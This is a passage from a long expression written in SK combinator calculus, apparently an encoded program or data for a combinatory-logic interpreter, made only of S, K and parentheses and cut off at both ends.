K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))((K)(K))))((((((((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)((K)(S)))(K))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)((K)((K)(((S)(K))(K)))))))))((K)(K))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))))))(((S)(K))(K)))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K)